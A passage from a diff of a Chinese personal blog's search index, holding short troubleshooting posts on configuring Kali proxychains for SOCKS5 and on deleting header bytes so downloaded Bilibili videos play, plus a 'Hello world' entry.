+    <content type="html"><![CDATA[<p>问题：kali proxychains使用sock5无法代理流量</p><p>解决：删除dynamic_chain前面的#号<br>          在strict_chain前面填写上#号</p><p>如图所示：</p><p><img src="https://zhangdeanquan.github.io/post-images/1663206783122.jpg"></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>疑难杂症</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>解决bilibili视频锁</title>
+    <link href="/2020/08/11/jie-jue-bilibili-shi-pin-suo/"/>
+    <url>/2020/08/11/jie-jue-bilibili-shi-pin-suo/</url>
+    
+    <content type="html"><![CDATA[<p>有时bilibili下载的视频遭遇无法播放<br><img src="https://zhangdeanquan.github.io/post-images/1663146709757.jpg"></p><p>解决方案：<br>编辑器打开视频文件，删除视频锁标志(前面的16进制位)<br>我这里使用notepad++<br><img src="https://zhangdeanquan.github.io/post-images/1663148496477.png"></p><p>视频正常播放<br><img src="https://zhangdeanquan.github.io/post-images/1663148653017.png"></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>疑难杂症</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Hello world</title>
+    <link href="/2018/12/12/hello-world/"/>
+    <url>/2018/12/12/hello-world/</url>
+    
+    <content type="html"><![CDATA[<p>你好世界！</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  
+</search>
